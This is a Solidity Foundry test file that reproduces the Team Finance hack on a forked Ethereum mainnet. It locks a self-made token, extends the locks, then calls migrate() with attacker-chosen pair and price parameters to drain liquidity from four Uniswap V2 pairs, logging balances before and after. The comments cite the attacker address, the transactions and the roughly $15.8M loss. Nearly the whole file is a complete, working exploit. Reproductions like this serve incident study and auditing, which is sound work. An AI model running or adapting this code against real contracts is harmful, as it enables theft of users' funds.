    // SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : Multiple Tokens ~$15.8M US$
// Root Cause : Lack of check function parameter legitimate
// Attacker : 0x161cebb807ac181d5303a4ccec2fc580cc5899fd
// Attack Contract : 0xcff07c4e6aa9e2fec04daaf5f41d1b10f3adadf4
// Vulnerable Contract : https://etherscan.io/address/0x48d118c9185e4dbafe7f3813f8f29ec8a6248359#code#L1535
// Attack Tx : https://etherscan.io/tx/0xb2e3ea72d353da43a2ac9a8f1670fd16463ab370e563b9b5b26119b2601277ce
//     Pre-work1: lockToken()
//       txId: https://etherscan.io/tx/0xe8f17ee00906cd0cfb61671937f11bd3d26cdc47c1534fedc43163a7e89edc6f
//     Pre-work2: extendLockDuration()
//       id 15324: https://etherscan.io/tx/0x2972f75d5926f8f948ab6a0cabc517a05f0da5b53e20f670591afbaa501aa436
//       id 15325: https://etherscan.io/tx/0xec75bb553f50af37f8dd8f4b1e2bfe4703b27f586187741b91db770ad9b230cb
//       id 15326: https://etherscan.io/tx/0x79ec728612867b3d82c0e7401e6ee1c533b240720c749b3968dea1464e59b2c4
//       id 15327: https://etherscan.io/tx/0x51185fb580892706500d3b6eebb8698c27d900618021fb9b1797f4a774fffb04
//
// @Analysis
// Team Finance Official : https://twitter.com/TeamFinance_/status/1585770918873542656
// PeckShield : https://twitter.com/peckshield/status/1585587858978623491
// Solid Group : https://twitter.com/solid_group_1/status/1585643249305518083
// Beiosin Alert : https://twitter.com/BeosinAlert/status/1585578499125178369

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant LockToken = 0xE2fE530C047f2d85298b07D9333C05737f1435fB;

// Token address
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
address constant caw = 0xf3b9569F82B18aEf890De263B84189bd33EBe452;
address constant tsuka = 0xc5fB36dd2fb59d3B98dEfF88425a3F425Ee469eD;
address constant selfmadeToken = 0x2d4ABfDcD1385951DF4317f9F3463fB11b9A31DF;
// Create at https://etherscan.io/tx/0xa3cbbdd2494f6d5452de8edc5c8c32f316abc40140a63769a22e04cd2549963b

// Pair address
address constant FEG_WETH_UniV2Pair = 0x854373387E41371Ac6E307A1F29603c6Fa10D872;
address constant USDC_CAW_UniV2Pair = 0x7a809081f991eCfe0aB2727C7E90D2Ad7c2E411E;
address constant USDC_TSUKA_UniV2Pair = 0x67CeA36eEB36Ace126A3Ca6E21405258130CF33C;
address constant KNDX_WETH_UniV2Pair = 0x9267C29e4f517cE9f6d603a15B50Aa47cE32278D;

contract Attacker is Test {
    address[4] victims = [FEG_WETH_UniV2Pair, USDC_CAW_UniV2Pair, USDC_TSUKA_UniV2Pair, KNDX_WETH_UniV2Pair];
    uint256[4] migrateId; // Will fill those from preWork()
    uint160 constant newPriceX96 = 79_210_883_607_084_793_911_461_085_816;
    // equal tick: -5,
    // equal price: 0.999563867
    // Can calculate it from: https://github.com/stakewithus/notes/blob/main/notebook/uniswap-v3/tick-and-sqrt-price-x-96.ipynb
    // And here: https://www.geogebra.org/solver?i=79210883607084793911461085816%3Dsqrt(x)*2%5E(96)

    function setUp() public {
        cheat.createSelectFork("mainnet", 15_837_893);
        cheat.label(weth, "WETH");
        cheat.label(usdc, "USDC");
        cheat.label(dai, "DAI");
        cheat.label(caw, "CAW");
        cheat.label(tsuka, "TSUKA");
        cheat.label(FEG_WETH_UniV2Pair, "FEG/WETH Pair");
        cheat.label(USDC_CAW_UniV2Pair, "USDC/CAW Pair");
        cheat.label(USDC_TSUKA_UniV2Pair, "USDC/TSUKA Pair");
        cheat.label(KNDX_WETH_UniV2Pair, "KNDX/WETH Pair");
        preWorks();
        cheat.deal(address(this), 0); // set this balance is 0 to show effect
    }

    // function 0xe0cec5b0
    function preWorks() public payable {
        uint256 _unlockTime = block.timestamp + 5;

        // txId: https://etherscan.io/tx/0xe8f17ee00906cd0cfb61671937f11bd3d26cdc47c1534fedc43163a7e89edc6f
        // Lock 4000000000 selfmadeToken, return 4 new NFT ID
        for (uint256 i; i < 4; ++i) {
            uint256 nftId = ILockToken(LockToken).lockToken{value: 0.5 ether}(
                selfmadeToken, address(this), 1_000_000_000, _unlockTime, false
            );
            migrateId[i] = nftId;
        }

        // txId-1: https://etherscan.io/tx/0x2972f75d5926f8f948ab6a0cabc517a05f0da5b53e20f670591afbaa501aa436
        // txId-2: https://etherscan.io/tx/0xec75bb553f50af37f8dd8f4b1e2bfe4703b27f586187741b91db770ad9b230cb
        // txId-3: https://etherscan.io/tx/0x79ec728612867b3d82c0e7401e6ee1c533b240720c749b3968dea1464e59b2c4
        // txId-4: https://etherscan.io/tx/0x51185fb580892706500d3b6eebb8698c27d900618021fb9b1797f4a774fffb04
        ILockToken(LockToken).extendLockDuration(migrateId[0], _unlockTime + 40_000);
        ILockToken(LockToken).extendLockDuration(migrateId[1], _unlockTime + 40_000);
        ILockToken(LockToken).extendLockDuration(migrateId[2], _unlockTime + 40_000);
        ILockToken(LockToken).extendLockDuration(migrateId[3], _unlockTime + 40_000);
    }

    function testExploit() public {
        IV3Migrator.MigrateParams memory parms;
        uint256 _liquidityToMigrate;

        emit log_named_decimal_uint("[Before] Attack Contract ETH balance", address(this).balance, 18);
        emit log_named_decimal_uint("[Before] Attack Contract DAI balance", IERC20(dai).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Before] Attack Contract CAW balance", IERC20(caw).balanceOf(address(this)), 18);
        emit log_named_decimal_uint(
            "[Before] Attack Contract TSUKA balance", IERC20(tsuka).balanceOf(address(this)), 18
        );

        // The exploit code could be written like a for loop, but we keep it simple to let you could do some debugging here.
        // ==================== Migrate FEG_WETH_UniV2Pair to V3 ====================
        _liquidityToMigrate = IERC20(FEG_WETH_UniV2Pair).balanceOf(LockToken);
        parms = IV3Migrator.MigrateParams({
            pair: FEG_WETH_UniV2Pair,
            liquidityToMigrate: _liquidityToMigrate,
            percentageToMigrate: 1, // 1%
            token0: selfmadeToken,
            token1: weth,
            fee: 500,
            tickLower: -100,
            tickUpper: 100,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp,
            refundAsETH: true
        });

        ILockToken(LockToken).migrate(migrateId[0], parms, true, newPriceX96, false);

        //console.log("\t[DEBUG]After migrated FEG_WETH_UniV2Pair, Attack Contract ETH balance", address(this).balance);

        // ==================== Migrate USDC_CAW_UniV2Pair to V3 ====================
        _liquidityToMigrate = IERC20(USDC_CAW_UniV2Pair).balanceOf(LockToken);
        parms = IV3Migrator.MigrateParams({
            pair: USDC_CAW_UniV2Pair,
            liquidityToMigrate: _liquidityToMigrate,
            percentageToMigrate: 1,
            token0: usdc,
            token1: caw,
            fee: 500,
            tickLower: -100,
            tickUpper: 100,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp,
            refundAsETH: true
        });

        ILockToken(LockToken).migrate(migrateId[1], parms, true, newPriceX96, false);

        uint256 usdc_bal = IERC20(usdc).balanceOf(address(this));

        if (usdc_bal > 0) {
            swapUsdcToDai();
        }

        //console.log("\t[DEBUG]After migrated USDC_CAW_UniV2Pair, Attack Contract DAI balance", IERC20(dai).balanceOf(address(this)));
        //console.log("\t[DEBUG]After migrated USDC_CAW_UniV2Pair, Attack Contract CAW balance", IERC20(caw).balanceOf(address(this)));

        // ==================== Migrate USDC_TSUKA_UniV2Pair to V3 ====================
        _liquidityToMigrate = IERC20(USDC_TSUKA_UniV2Pair).balanceOf(LockToken);
        parms = IV3Migrator.MigrateParams({
            pair: USDC_TSUKA_UniV2Pair,
            liquidityToMigrate: _liquidityToMigrate,
            percentageToMigrate: 1,
            token0: usdc,
            token1: tsuka,
            fee: 500,
            tickLower: -100,
            tickUpper: 100,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp,
            refundAsETH: true
        });
        ILockToken(LockToken).migrate(migrateId[2], parms, true, newPriceX96, false);

        usdc_bal = IERC20(usdc).balanceOf(address(this));

        if (usdc_bal > 0) {
            swapUsdcToDai();
        }

        //console.log("\t[DEBUG]After migrated USDC_TSUKA_UniV2Pair, Attack Contract DAI balance", IERC20(dai).balanceOf(address(this)));
        //console.log("\t[DEBUG]After migrated USDC_TSUKA_UniV2Pair, Attack Contract TSUKA balance", IERC20(caw).balanceOf(address(this)));

        //// ==================== Migrate KNDX_WETH_UniV2Pair to V3 ====================
        _liquidityToMigrate = IERC20(KNDX_WETH_UniV2Pair).balanceOf(LockToken);
        parms = IV3Migrator.MigrateParams({
            pair: KNDX_WETH_UniV2Pair,
            liquidityToMigrate: _liquidityToMigrate,
            percentageToMigrate: 1,
            token0: selfmadeToken,
            token1: weth,
            fee: 500,
            tickLower: -100,
            tickUpper: 100,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp,
            refundAsETH: true
        });

        ILockToken(LockToken).migrate(migrateId[3], parms, true, newPriceX96, false);

        //console.log("\t[DEBUG] After migrated KNDX_WETH_UniV2Pair, Attack Contract ETH balance", address(this).balance);

        // ===========================================================================

        emit log_named_decimal_uint("[After] Attack Contract ETH balance", address(this).balance, 18);
        emit log_named_decimal_uint("[After] Attack Contract DAI balance", IERC20(dai).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[After] Attack Contract CAW balance", IERC20(caw).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[After] Attack Contract TSUKA balance", IERC20(tsuka).balanceOf(address(this)), 18);
    }

    // Function 0xf9b65204
    function swapUsdcToDai() private {
        address curve_3pool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
        uint256 usdc_bal = IERC20(usdc).balanceOf(address(this));
        uint256 min_dy = usdc_bal / 100 * 98;
        IERC20(usdc).approve(curve_3pool, type(uint256).max);
        ICurvePool(curve_3pool).exchange(1, 0, usdc_bal, min_dy);
    }

    receive() external payable {}
}

/* -------------------- Interface -------------------- */

interface IV3Migrator {
    struct MigrateParams {
        address pair; // the Uniswap v2-compatible pair
        uint256 liquidityToMigrate; // expected to be balanceOf(msg.sender)
        uint8 percentageToMigrate; // represented as a numerator over 100
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Min; // must be discounted by percentageToMigrate
        uint256 amount1Min; // must be discounted by percentageToMigrate
        address recipient;
        uint256 deadline;
        bool refundAsETH;
    }
}

interface ILockToken {
    struct Items {
        address tokenAddress;
        address withdrawalAddress;
        uint256 tokenAmount;
        uint256 unlockTime;
        bool withdrawn;
    }

    function migrate(
        uint256 _id,
        IV3Migrator.MigrateParams calldata params,
        bool noLiquidity,
        uint160 sqrtPriceX96,
        bool _mintNFT
    ) external payable;

    //function lockedToken(uint256) external returns(Items memory);

    function lockToken(
        address _tokenAddress,
        address _withdrawalAddress,
        uint256 _amount,
        uint256 _unlockTime,
        bool _mintNFT
    ) external payable returns (uint256 _id);

    function extendLockDuration(uint256 _id, uint256 _unlockTime) external;
}
